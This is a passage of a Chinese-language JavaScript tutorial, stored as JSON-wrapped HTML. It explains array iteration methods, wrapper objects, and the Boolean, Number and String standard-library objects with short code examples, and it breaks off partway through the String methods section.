<p>这两个方法类似“断言”（assert），返回一个布尔值，表示判断数组成员是否符合某种条件。</p>\n<p>它们接受一个函数作为参数，所有数组成员依次执行该函数。该函数接受三个参数：当前成员、当前位置和整个数组，然后返回一个布尔值。</p>\n<p><code>some</code>方法是只要一个成员的返回值是<code>true</code>，则整个<code>some</code>方法的返回值就是<code>true</code>，否则返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [1, 2, 3, 4, 5];\narr.some(function (elem, index, arr) {\n  return elem &gt;= 3;\n});\n// true</code></pre><p>上面代码中，如果数组<code>arr</code>有一个成员大于等于3，<code>some</code>方法就返回<code>true</code>。</p>\n<p><code>every</code>方法是所有成员的返回值都是<code>true</code>，整个<code>every</code>方法才返回<code>true</code>，否则返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var arr = [1, 2, 3, 4, 5];\narr.every(function (elem, index, arr) {\n  return elem &gt;= 3;\n});\n// false</code></pre><p>上面代码中，数组<code>arr</code>并非所有成员大于等于<code>3</code>，所以返回<code>false</code>。</p>\n<p>注意，对于空数组，<code>some</code>方法返回<code>false</code>，<code>every</code>方法返回<code>true</code>，回调函数都不会执行。</p>\n<pre class=\"prettyprint language-javascript\"><code>function isEven(x) { return x % 2 === 0 }\n\n[].some(isEven) // false\n[].every(isEven) // true</code></pre><p><code>some</code>和<code>every</code>方法还可以接受第二个参数，用来绑定参数函数内部的<code>this</code>变量。</p>\n\n        <h3>\n            <a href='#reduce()，reduceRight()' class='header-anchor'>#</a>\n            <span>reduce()，reduceRight()</span>\n        </h3>\n    <p><code>reduce</code>方法和<code>reduceRight</code>方法依次处理数组的每个成员，最终累计为一个值。它们的差别是，<code>reduce</code>是从左到右处理（从第一个成员到最后一个成员），<code>reduceRight</code>则是从右到左（从最后一个成员到第一个成员），其他完全一样。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3, 4, 5].reduce(function (a, b) {\n  console.log(a, b);\n  return a + b;\n})\n// 1 2\n// 3 3\n// 6 4\n// 10 5\n//最后结果：15</code></pre><p>上面代码中，<code>reduce</code>方法求出数组所有成员的和。第一次执行，<code>a</code>是数组的第一个成员<code>1</code>，<code>b</code>是数组的第二个成员<code>2</code>。第二次执行，<code>a</code>为上一轮的返回值<code>3</code>，<code>b</code>为第三个成员<code>3</code>。第三次执行，<code>a</code>为上一轮的返回值<code>6</code>，<code>b</code>为第四个成员<code>4</code>。第四次执行，<code>a</code>为上一轮返回值<code>10</code>，<code>b</code>为第五个成员<code>5</code>。至此所有成员遍历完成，整个方法的返回值就是最后一轮的返回值<code>15</code>。</p>\n<p><code>reduce</code>方法和<code>reduceRight</code>方法的第一个参数都是一个函数。该函数接受以下四个参数。</p>\n<ol>\n<li>累积变量，默认为数组的第一个成员</li>\n<li>当前变量，默认为数组的第二个成员</li>\n<li>当前位置（从0开始）</li>\n<li>原数组</li>\n</ol>\n<p>这四个参数之中，只有前两个是必须的，后两个则是可选的。</p>\n<p>如果要对累积变量指定初值，可以把它放在<code>reduce</code>方法和<code>reduceRight</code>方法的第二个参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>[1, 2, 3, 4, 5].reduce(function (a, b) {\n  return a + b;\n}, 10);\n// 25</code></pre><p>上面代码指定参数<code>a</code>的初值为10，所以数组从10开始累加，最终结果为25。注意，这时<code>b</code>是从数组的第一个成员开始遍历。</p>\n<p>上面的第二个参数相当于设定了默认值，处理空数组时尤其有用。</p>\n<pre class=\"prettyprint language-javascript\"><code>function add(prev, cur) {\n  return prev + cur;\n}\n\n[].reduce(add)\n// TypeError: Reduce of empty array with no initial value\n[].reduce(add, 1)\n// 1</code></pre><p>上面代码中，由于空数组取不到初始值，<code>reduce</code>方法会报错。这时，加上第二个参数，就能保证总是会返回一个值。</p>\n<p>下面是一个<code>reduceRight</code>方法的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>function substract(prev, cur) {\n  return prev - cur;\n}\n\n[3, 2, 1].reduce(substract) // 0\n[3, 2, 1].reduceRight(substract) // -4</code></pre><p>上面代码中，<code>reduce</code>方法相当于<code>3</code>减去<code>2</code>再减去<code>1</code>，<code>reduceRight</code>方法相当于<code>1</code>减去<code>2</code>再减去<code>3</code>。</p>\n<p>由于这两个方法会遍历数组，所以实际上还可以用来做一些遍历相关的操作。比如，找出字符长度最长的数组成员。</p>\n<pre class=\"prettyprint language-javascript\"><code>function findLongest(entries) {\n  return entries.reduce(function (longest, entry) {\n    return entry.length &gt; longest.length ? entry : longest;\n  }, &#039;&#039;);\n}\n\nfindLongest([&#039;aaa&#039;, &#039;bb&#039;, &#039;c&#039;]) // &quot;aaa&quot;</code></pre><p>上面代码中，<code>reduce</code>的参数函数会将字符长度较长的那个数组成员，作为累积值。这导致遍历所有成员之后，累积值就是字符长度最长的那个成员。</p>\n\n        <h3>\n            <a href='#indexOf()，lastIndexOf()' class='header-anchor'>#</a>\n            <span>indexOf()，lastIndexOf()</span>\n        </h3>\n    <p><code>indexOf</code>方法返回给定元素在数组中第一次出现的位置，如果没有出现则返回<code>-1</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [&#039;a&#039;, &#039;b&#039;, &#039;c&#039;];\n\na.indexOf(&#039;b&#039;) // 1\na.indexOf(&#039;y&#039;) // -1</code></pre><p><code>indexOf</code>方法还可以接受第二个参数，表示搜索的开始位置。</p>\n<pre class=\"prettyprint language-javascript\"><code>[&#039;a&#039;, &#039;b&#039;, &#039;c&#039;].indexOf(&#039;a&#039;, 1) // -1</code></pre><p>上面代码从1号位置开始搜索字符<code>a</code>，结果为<code>-1</code>，表示没有搜索到。</p>\n<p><code>lastIndexOf</code>方法返回给定元素在数组中最后一次出现的位置，如果没有出现则返回<code>-1</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = [2, 5, 9, 2];\na.lastIndexOf(2) // 3\na.lastIndexOf(7) // -1</code></pre><p>注意，这两个方法不能用来搜索<code>NaN</code>的位置，即它们无法确定数组成员是否包含<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>[NaN].indexOf(NaN) // -1\n[NaN].lastIndexOf(NaN) // -1</code></pre><p>这是因为这两个方法内部，使用严格相等运算符（<code>===</code>）进行比较，而<code>NaN</code>是唯一一个不等于自身的值。</p>\n\n        <h3>\n            <a href='#链式使用' class='header-anchor'>#</a>\n            <span>链式使用</span>\n        </h3>\n    <p>上面这些数组方法之中，有不少返回的还是数组，所以可以链式使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var users = [\n  {name: &#039;tom&#039;, email: &#039;tom@example.com&#039;},\n  {name: &#039;peter&#039;, email: &#039;peter@example.com&#039;}\n];\n\nusers\n.map(function (user) {\n  return user.email;\n})\n.filter(function (email) {\n  return /^t/.test(email);\n})\n.forEach(console.log);\n// &quot;tom@example.com&quot;</code></pre><p>上面代码中，先产生一个所有 Email 地址组成的数组，然后再过滤出以<code>t</code>开头的 Email 地址。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Nicolas Bevacqua, <a href=\"http://flippinawesome.org/2013/11/25/fun-with-javascript-native-array-functions/\">Fun with JavaScript Native Array Functions</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"包装对象","link":"/stdlib/wrapper.html"}],"content":"\n        <h1>\n            <a href='#包装对象' class='header-anchor'>#</a>\n            <span>包装对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#定义' class='header-anchor'>#</a>\n            <span>定义</span>\n        </h2>\n    <p>对象是 JavaScript 语言最主要的数据类型，三种原始类型的值——数值、字符串、布尔值——在一定条件下，也会自动转为对象，也就是原始类型的“包装对象”。</p>\n<p>所谓“包装对象”，就是分别与数值、字符串、布尔值相对应的<code>Number</code>、<code>String</code>、<code>Boolean</code>三个原生对象。这三个原生对象可以把原始类型的值变成（包装成）对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var v1 = new Number(123);\nvar v2 = new String(&#039;abc&#039;);\nvar v3 = new Boolean(true);</code></pre><p>上面代码中，基于原始类型的值，生成了三个对应的包装对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>typeof v1 // &quot;object&quot;\ntypeof v2 // &quot;object&quot;\ntypeof v3 // &quot;object&quot;\n\nv1 === 123 // false\nv2 === &#039;abc&#039; // false\nv3 === true // false</code></pre><p>包装对象的最大目的，首先是使得 JavaScript 的对象涵盖所有的值，其次使得原始类型的值可以方便地调用某些方法。</p>\n<p><code>Number</code>、<code>String</code>和<code>Boolean</code>如果不作为构造函数调用（即调用时不加<code>new</code>），常常用于将任意类型的值转为数值、字符串和布尔值。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number(123) // 123\nString(&#039;abc&#039;) // &quot;abc&quot;\nBoolean(true) // true</code></pre><p>上面这种数据类型的转换，详见《数据类型转换》一节。</p>\n<p>总结一下，这三个对象作为构造函数使用（带有<code>new</code>）时，可以将原始类型的值转为对象；作为普通函数使用时（不带有<code>new</code>），可以将任意类型的值，转为原始类型的值。</p>\n\n        <h2>\n            <a href='#实例方法' class='header-anchor'>#</a>\n            <span>实例方法</span>\n        </h2>\n    <p>三种包装对象各自提供了许多实例方法，详见后文。这里介绍两种它们共同具有、从<code>Object</code>对象继承的方法：<code>valueOf</code>和<code>toString</code>。</p>\n\n        <h3>\n            <a href='#valueOf()' class='header-anchor'>#</a>\n            <span>valueOf()</span>\n        </h3>\n    <p><code>valueOf</code>方法返回包装对象实例对应的原始类型的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Number(123).valueOf()  // 123\nnew String(&#039;abc&#039;).valueOf() // &quot;abc&quot;\nnew Boolean(true).valueOf() // true</code></pre>\n        <h3>\n            <a href='#toString()' class='header-anchor'>#</a>\n            <span>toString()</span>\n        </h3>\n    <p><code>toString</code>方法返回对应的字符串形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>new Number(123).toString() // &quot;123&quot;\nnew String(&#039;abc&#039;).toString() // &quot;abc&quot;\nnew Boolean(true).toString() // &quot;true&quot;</code></pre>\n        <h2>\n            <a href='#原始类型与实例对象的自动转换' class='header-anchor'>#</a>\n            <span>原始类型与实例对象的自动转换</span>\n        </h2>\n    <p>原始类型的值，可以自动当作包装对象调用，即调用包装对象的属性和方法。这时，JavaScript 引擎会自动将原始类型的值转为包装对象实例，在使用后立刻销毁实例。</p>\n<p>比如，字符串可以调用<code>length</code>属性，返回字符串的长度。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;.length // 3</code></pre><p>上面代码中，<code>abc</code>是一个字符串，本身不是对象，不能调用<code>length</code>属性。JavaScript 引擎自动将其转为包装对象，在这个对象上调用<code>length</code>属性。调用结束后，这个临时对象就会被销毁。这就叫原始类型与实例对象的自动转换。</p>\n<pre class=\"prettyprint language-javascript\"><code>var str = &#039;abc&#039;;\nstr.length // 3\n\n// 等同于\nvar strObj = new String(str)\n// String {\n//   0: &quot;a&quot;, 1: &quot;b&quot;, 2: &quot;c&quot;, length: 3, [[PrimitiveValue]]: &quot;abc&quot;\n// }\nstrObj.length // 3</code></pre><p>上面代码中，字符串<code>abc</code>的包装对象提供了多个属性。</p>\n<p>自动转换生成的包装对象是只读的，无法修改。所以，字符串无法添加新属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;Hello World&#039;;\ns.x = 123;\ns.x // undefined</code></pre><p>上面代码为字符串<code>s</code>添加了一个<code>x</code>属性，结果无效，总是返回<code>undefined</code>。</p>\n<p>另一方面，调用结束后，包装对象实例会自动销毁。这意味着，下一次调用字符串的属性时，实际是调用一个新生成的对象，而不是上一次调用时生成的那个对象，所以取不到赋值在上一个对象的属性。如果要为字符串添加属性，只有在它的原型对象<code>String.prototype</code>上定义（参见《面向对象编程》章节）。</p>\n\n        <h2>\n            <a href='#自定义方法' class='header-anchor'>#</a>\n            <span>自定义方法</span>\n        </h2>\n    <p>除了原生的实例方法，包装对象还可以自定义方法和属性，供原始类型的值直接调用。</p>\n<p>比如，我们可以新增一个<code>double</code>方法，使得字符串和数字翻倍。</p>\n<pre class=\"prettyprint language-javascript\"><code>String.prototype.double = function () {\n  return this.valueOf() + this.valueOf();\n};\n\n&#039;abc&#039;.double()\n// abcabc\n\nNumber.prototype.double = function () {\n  return this.valueOf() + this.valueOf();\n};\n\n(123).double()\n// 246</code></pre><p>上面代码在<code>123</code>外面必须要加上圆括号，否则后面的点运算符（<code>.</code>）会被解释成小数点。</p>\n<p>但是，这种自定义方法和属性的机制，只能定义在包装对象的原型上，如果直接对原始类型的变量添加属性，则无效。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;abc&#039;;\n\ns.p = 123;\ns.p // undefined</code></pre><p>上面代码直接对字符串<code>abc</code>添加属性，结果无效。主要原因是上面说的，这里的包装对象是自动生成的，赋值后自动销毁，所以最后一行实际上调用的是一个新的包装对象。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"Boolean 对象","link":"/stdlib/boolean.html"}],"content":"\n        <h1>\n            <a href='#Boolean-对象' class='header-anchor'>#</a>\n            <span>Boolean 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p><code>Boolean</code>对象是 JavaScript 的三个包装对象之一。作为构造函数，它主要用于生成布尔值的包装对象实例。</p>\n<pre class=\"prettyprint language-javascript\"><code>var b = new Boolean(true);\n\ntypeof b // &quot;object&quot;\nb.valueOf() // true</code></pre><p>上面代码的变量<code>b</code>是一个<code>Boolean</code>对象的实例，它的类型是对象，值为布尔值<code>true</code>。</p>\n<p>注意，<code>false</code>对应的包装对象实例，布尔运算结果也是<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (new Boolean(false)) {\n  console.log(&#039;true&#039;);\n} // true\n\nif (new Boolean(false).valueOf()) {\n  console.log(&#039;true&#039;);\n} // 无输出</code></pre><p>上面代码的第一个例子之所以得到<code>true</code>，是因为<code>false</code>对应的包装对象实例是一个对象，进行逻辑运算时，被自动转化成布尔值<code>true</code>（因为所有对象对应的布尔值都是<code>true</code>）。而实例的<code>valueOf</code>方法，则返回实例对应的原始值，本例为<code>false</code>。</p>\n\n        <h2>\n            <a href='#Boolean-函数的类型转换作用' class='header-anchor'>#</a>\n            <span>Boolean 函数的类型转换作用</span>\n        </h2>\n    <p><code>Boolean</code>对象除了可以作为构造函数，还可以单独使用，将任意值转为布尔值。这时<code>Boolean</code>就是一个单纯的工具方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>Boolean(undefined) // false\nBoolean(null) // false\nBoolean(0) // false\nBoolean(&#039;&#039;) // false\nBoolean(NaN) // false\n\nBoolean(1) // true\nBoolean(&#039;false&#039;) // true\nBoolean([]) // true\nBoolean({}) // true\nBoolean(function () {}) // true\nBoolean(/foo/) // true</code></pre><p>上面代码中几种得到<code>true</code>的情况，都值得认真记住。</p>\n<p>顺便提一下，使用双重的否运算符（<code>!</code>）也可以将任意值转为对应的布尔值。</p>\n<pre class=\"prettyprint language-javascript\"><code>!!undefined // false\n!!null // false\n!!0 // false\n!!&#039;&#039; // false\n!!NaN // false\n!!1 // true\n!!&#039;false&#039; // true\n!![] // true\n!!{} // true\n!!function(){} // true\n!!/foo/ // true</code></pre><p>最后，对于一些特殊值，<code>Boolean</code>对象前面加不加<code>new</code>，会得到完全相反的结果，必须小心。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (Boolean(false)) {\n  console.log(&#039;true&#039;);\n} // 无输出\n\nif (new Boolean(false)) {\n  console.log(&#039;true&#039;);\n} // true\n\nif (Boolean(null)) {\n  console.log(&#039;true&#039;);\n} // 无输出\n\nif (new Boolean(null)) {\n  console.log(&#039;true&#039;);\n} // true</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"Number 对象","link":"/stdlib/number.html"}],"content":"\n        <h1>\n            <a href='#Number-对象' class='header-anchor'>#</a>\n            <span>Number 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p><code>Number</code>对象是数值对应的包装对象，可以作为构造函数使用，也可以作为工具函数使用。</p>\n<p>作为构造函数时，它用于生成值为数值的对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var n = new Number(1);\ntypeof n // &quot;object&quot;</code></pre><p>上面代码中，<code>Number</code>对象作为构造函数使用，返回一个值为<code>1</code>的对象。</p>\n<p>作为工具函数时，它可以将任何类型的值转为数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number(true) // 1</code></pre><p>上面代码将布尔值<code>true</code>转为数值<code>1</code>。<code>Number</code>作为工具函数的用法，详见《数据类型转换》一章。</p>\n\n        <h2>\n            <a href='#静态属性' class='header-anchor'>#</a>\n            <span>静态属性</span>\n        </h2>\n    <p><code>Number</code>对象拥有以下一些静态属性（即直接定义在<code>Number</code>对象上的属性，而不是定义在实例上的属性）。</p>\n<ul>\n<li><code>Number.POSITIVE_INFINITY</code>：正的无限，指向<code>Infinity</code>。</li>\n<li><code>Number.NEGATIVE_INFINITY</code>：负的无限，指向<code>-Infinity</code>。</li>\n<li><code>Number.NaN</code>：表示非数值，指向<code>NaN</code>。</li>\n<li><code>Number.MIN_VALUE</code>：表示最小的正数（即最接近0的正数，在64位浮点数体系中为<code>5e-324</code>），相应的，最接近0的负数为<code>-Number.MIN_VALUE</code>。</li>\n<li><code>Number.MAX_SAFE_INTEGER</code>：表示能够精确表示的最大整数，即<code>9007199254740991</code>。</li>\n<li><code>Number.MIN_SAFE_INTEGER</code>：表示能够精确表示的最小整数，即<code>-9007199254740991</code>。</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>Number.POSITIVE_INFINITY // Infinity\nNumber.NEGATIVE_INFINITY // -Infinity\nNumber.NaN // NaN\n\nNumber.MAX_VALUE\n// 1.7976931348623157e+308\nNumber.MAX_VALUE &lt; Infinity\n// true\n\nNumber.MIN_VALUE\n// 5e-324\nNumber.MIN_VALUE &gt; 0\n// true\n\nNumber.MAX_SAFE_INTEGER // 9007199254740991\nNumber.MIN_SAFE_INTEGER // -9007199254740991</code></pre>\n        <h2>\n            <a href='#实例方法' class='header-anchor'>#</a>\n            <span>实例方法</span>\n        </h2>\n    <p><code>Number</code>对象有4个实例方法，都跟将数值转换成指定格式有关。</p>\n\n        <h3>\n            <a href='#Number.prototype.toString()' class='header-anchor'>#</a>\n            <span>Number.prototype.toString()</span>\n        </h3>\n    <p><code>Number</code>对象部署了自己的<code>toString</code>方法，用来将一个数值转为字符串形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>(10).toString() // &quot;10&quot;</code></pre><p><code>toString</code>方法可以接受一个参数，表示输出的进制。如果省略这个参数，默认将数值先转为十进制，再输出字符串；否则，就根据参数指定的进制，将一个数字转化成某个进制的字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>(10).toString(2) // &quot;1010&quot;\n(10).toString(8) // &quot;12&quot;\n(10).toString(16) // &quot;a&quot;</code></pre><p>上面代码中，<code>10</code>一定要放在括号里，这样表明后面的点表示调用对象属性。如果不加括号，这个点会被 JavaScript 引擎解释成小数点，从而报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>10.toString(2)\n// SyntaxError: Unexpected token ILLEGAL</code></pre><p>只要能够让 JavaScript 引擎不混淆小数点和对象的点运算符，各种写法都能用。除了为<code>10</code>加上括号，还可以在<code>10</code>后面加两个点，JavaScript 会把第一个点理解成小数点（即<code>10.0</code>），把第二个点理解成调用对象属性，从而得到正确结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>10..toString(2)\n// &quot;1010&quot;\n\n// 其他方法还包括\n10 .toString(2) // &quot;1010&quot;\n10.0.toString(2) // &quot;1010&quot;</code></pre><p>这实际上意味着，可以直接对一个小数使用<code>toString</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>10.5.toString() // &quot;10.5&quot;\n10.5.toString(2) // &quot;1010.1&quot;\n10.5.toString(8) // &quot;12.4&quot;\n10.5.toString(16) // &quot;a.8&quot;</code></pre><p>通过方括号运算符也可以调用<code>toString</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>10[&#039;toString&#039;](2) // &quot;1010&quot;</code></pre><p><code>toString</code>方法只能将十进制的数，转为其他进制的字符串。如果要将其他进制的数，转回十进制，需要使用<code>parseInt</code>方法。</p>\n\n        <h3>\n            <a href='#Number.prototype.toFixed()' class='header-anchor'>#</a>\n            <span>Number.prototype.toFixed()</span>\n        </h3>\n    <p><code>toFixed</code>方法先将一个数转为指定位数的小数，然后返回这个小数对应的字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>(10).toFixed(2) // &quot;10.00&quot;\n10.005.toFixed(2) // &quot;10.01&quot;</code></pre><p>上面代码中，<code>10</code>和<code>10.005</code>转成2位小数，其中<code>10</code>必须放在括号里，否则后面的点会被处理成小数点。</p>\n<p><code>toFixed</code>方法的参数为小数位数，有效范围为0到20，超出这个范围将抛出 RangeError 错误。</p>\n\n        <h3>\n            <a href='#Number.prototype.toExponential()' class='header-anchor'>#</a>\n            <span>Number.prototype.toExponential()</span>\n        </h3>\n    <p><code>toExponential</code>方法用于将一个数转为科学计数法形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>(10).toExponential()  // &quot;1e+1&quot;\n(10).toExponential(1) // &quot;1.0e+1&quot;\n(10).toExponential(2) // &quot;1.00e+1&quot;\n\n(1234).toExponential()  // &quot;1.234e+3&quot;\n(1234).toExponential(1) // &quot;1.2e+3&quot;\n(1234).toExponential(2) // &quot;1.23e+3&quot;</code></pre><p><code>toExponential</code>方法的参数是小数点后有效数字的位数，范围为0到20，超出这个范围，会抛出一个 RangeError 错误。</p>\n\n        <h3>\n            <a href='#Number.prototype.toPrecision()' class='header-anchor'>#</a>\n            <span>Number.prototype.toPrecision()</span>\n        </h3>\n    <p><code>toPrecision</code>方法用于将一个数转为指定位数的有效数字。</p>\n<pre class=\"prettyprint language-javascript\"><code>(12.34).toPrecision(1) // &quot;1e+1&quot;\n(12.34).toPrecision(2) // &quot;12&quot;\n(12.34).toPrecision(3) // &quot;12.3&quot;\n(12.34).toPrecision(4) // &quot;12.34&quot;\n(12.34).toPrecision(5) // &quot;12.340&quot;</code></pre><p><code>toPrecision</code>方法的参数为有效数字的位数，范围是1到21，超出这个范围会抛出 RangeError 错误。</p>\n<p><code>toPrecision</code>方法用于四舍五入时不太可靠，跟浮点数不是精确储存有关。</p>\n<pre class=\"prettyprint language-javascript\"><code>(12.35).toPrecision(3) // &quot;12.3&quot;\n(12.25).toPrecision(3) // &quot;12.3&quot;\n(12.15).toPrecision(3) // &quot;12.2&quot;\n(12.45).toPrecision(3) // &quot;12.4&quot;</code></pre>\n        <h2>\n            <a href='#自定义方法' class='header-anchor'>#</a>\n            <span>自定义方法</span>\n        </h2>\n    <p>与其他对象一样，<code>Number.prototype</code>对象上面可以自定义方法，被<code>Number</code>的实例继承。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number.prototype.add = function (x) {\n  return this + x;\n};\n\n8[&#039;add&#039;](2) // 10</code></pre><p>上面代码为<code>Number</code>对象实例定义了一个<code>add</code>方法。在数值上调用某个方法，数值会自动转为<code>Number</code>的实例对象，所以就可以调用<code>add</code>方法了。由于<code>add</code>方法返回的还是数值，所以可以链式运算。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number.prototype.subtract = function (x) {\n  return this - x;\n};\n\n(8).add(2).subtract(4)\n// 6</code></pre><p>上面代码在<code>Number</code>对象的实例上部署了<code>subtract</code>方法，它可以与<code>add</code>方法链式调用。</p>\n<p>我们还可以部署更复杂的方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>Number.prototype.iterate = function () {\n  var result = [];\n  for (var i = 0; i &lt;= this; i++) {\n    result.push(i);\n  }\n  return result;\n};\n\n(8).iterate()\n// [0, 1, 2, 3, 4, 5, 6, 7, 8]</code></pre><p>上面代码在<code>Number</code>对象的原型上部署了<code>iterate</code>方法，将一个数值自动遍历为一个数组。</p>\n<p>注意，数值的自定义方法，只能定义在它的原型对象<code>Number.prototype</code>上面，数值本身是无法自定义属性的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var n = 1;\nn.x = 1;\nn.x // undefined</code></pre><p>上面代码中，<code>n</code>是一个原始类型的数值。直接在它上面新增一个属性<code>x</code>，不会报错，但毫无作用，总是返回<code>undefined</code>。这是因为一旦被调用属性，<code>n</code>就自动转为<code>Number</code>的实例对象，调用结束后，该对象自动销毁。所以，下一次调用<code>n</code>的属性时，实际取到的是另一个对象，属性<code>x</code>当然就读不出来。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"标准库","link":"javascript:void(0)"},{"title":"String 对象","link":"/stdlib/string.html"}],"content":"\n        <h1>\n            <a href='#String-对象' class='header-anchor'>#</a>\n            <span>String 对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p><code>String</code>对象是 JavaScript 原生提供的三个包装对象之一，用来生成字符串对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s1 = &#039;abc&#039;;\nvar s2 = new String(&#039;abc&#039;);\n\ntypeof s1 // &quot;string&quot;\ntypeof s2 // &quot;object&quot;\n\ns2.valueOf() // &quot;abc&quot;</code></pre><p>上面代码中，变量<code>s1</code>是字符串，<code>s2</code>是对象。由于<code>s2</code>是字符串对象，<code>s2.valueOf</code>方法返回的就是它所对应的原始字符串。</p>\n<p>字符串对象是一个类似数组的对象（很像数组，但不是数组）。</p>\n<pre class=\"prettyprint language-javascript\"><code>new String(&#039;abc&#039;)\n// String {0: &quot;a&quot;, 1: &quot;b&quot;, 2: &quot;c&quot;, length: 3}\n\n(new String(&#039;abc&#039;))[1] // &quot;b&quot;</code></pre><p>上面代码中，字符串<code>abc</code>对应的字符串对象，有数值键（<code>0</code>、<code>1</code>、<code>2</code>）和<code>length</code>属性，所以可以像数组那样取值。</p>\n<p>除了用作构造函数，<code>String</code>对象还可以当作工具方法使用，将任意类型的值转为字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>String(true) // &quot;true&quot;\nString(5) // &quot;5&quot;</code></pre><p>上面代码将布尔值<code>ture</code>和数值<code>5</code>，分别转换为字符串。</p>\n\n        <h2>\n            <a href='#静态方法' class='header-anchor'>#</a>\n            <span>静态方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#String.fromCharCode()' class='header-anchor'>#</a>\n            <span>String.fromCharCode()</span>\n        </h3>\n    <p><code>String</code>对象提供的静态方法（即定义在对象本身，而不是定义在对象实例的方法），主要是<code>String.fromCharCode()</code>。该方法的参数是一个或多个数值，代表 Unicode 码点，返回值是这些码点组成的字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>String.fromCharCode() // &quot;&quot;\nString.fromCharCode(97) // &quot;a&quot;\nString.fromCharCode(104, 101, 108, 108, 111)\n// &quot;hello&quot;</code></pre><p>上面代码中，<code>String.fromCharCode</code>方法的参数为空，就返回空字符串；否则，返回参数对应的 Unicode 字符串。</p>\n<p>注意，该方法不支持 Unicode 码点大于<code>0xFFFF</code>的字符，即传入的参数不能大于<code>0xFFFF</code>（即十进制的 65535）。</p>\n<pre class=\"prettyprint language-javascript\"><code>String.fromCharCode(0x20BB7)\n// &quot;ஷ&quot;\nString.fromCharCode(0x20BB7) === String.fromCharCode(0x0BB7)\n// true</code></pre><p>上面代码中，<code>String.fromCharCode</code>参数<code>0x20BB7</code>大于<code>0xFFFF</code>，导致返回结果出错。<code>0x20BB7</code>对应的字符是汉字<code>𠮷</code>，但是返回结果却是另一个字符（码点<code>0x0BB7</code>）。这是因为<code>String.fromCharCode</code>发现参数值大于<code>0xFFFF</code>，就会忽略多出的位（即忽略<code>0x20BB7</code>里面的<code>2</code>）。</p>\n<p>这种现象的根本原因在于，码点大于<code>0xFFFF</code>的字符占用四个字节，而 JavaScript 默认支持两个字节的字符。这种情况下，必须把<code>0x20BB7</code>拆成两个字符表示。</p>\n<pre class=\"prettyprint language-javascript\"><code>String.fromCharCode(0xD842, 0xDFB7)\n// &quot;𠮷&quot;</code></pre><p>上面代码中，<code>0x20BB7</code>拆成两个字符<code>0xD842</code>和<code>0xDFB7</code>（即两个两字节字符，合成一个四字节字符），就能得到正确的结果。码点大于<code>0xFFFF</code>的字符的四字节表示法，由 UTF-16 编码方法决定。</p>\n\n        <h2>\n            <a href='#实例属性' class='header-anchor'>#</a>\n            <span>实例属性</span>\n        </h2>\n    \n        <h3>\n            <a href='#String.prototype.length' class='header-anchor'>#</a>\n            <span>String.prototype.length</span>\n        </h3>\n    <p>字符串实例的<code>length</code>属性返回字符串的长度。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;.length // 3</code></pre>\n        <h2>\n            <a href='#实例方法' class='header-anchor'>#</a>\n            <span>实例方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#String.prototype.charAt()' class='header-anchor'>#</a>\n            <span>String.prototype.charAt()</span>\n        </h3>\n    <p><code>charAt</code>方法返回指定位置的字符，参数是从<code>0</code>开始编号的位置。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = new String(&#039;abc&#039;);\n\ns.charAt(1) // &quot;b&quot;\ns.charAt(s.length - 1) // &quot;c&quot;</code></pre><p>这个方法完全可以用数组下标替代。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;.charAt(1) // &quot;b&quot;\n&#039;abc&#039;[1] // 